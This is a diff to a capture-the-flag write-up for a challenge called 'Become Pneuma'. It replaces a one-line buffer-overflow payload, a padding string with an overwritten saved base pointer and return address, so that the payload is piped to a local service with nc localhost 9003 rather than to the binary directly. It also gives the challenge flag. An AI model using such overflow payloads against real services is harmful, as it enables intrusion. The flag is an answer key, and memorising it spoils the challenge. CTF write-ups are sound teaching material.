@@ -8,7 +8,7 @@ Become Pneuma
 
 ## Writeup
 
-`echo -e "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaRBPRBPRB\x76\x12\x40\x00\x00\x00\x00\x00" | ./pneuma`
+`echo -e "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaRBPRBPRB\xFD\x12\x40\x00\x00\x00\x00\x00" | nc localhost 9003`
 
 ## Flag
 `SgffCTF{3y3s_fu11_0f_w0nd3r}`
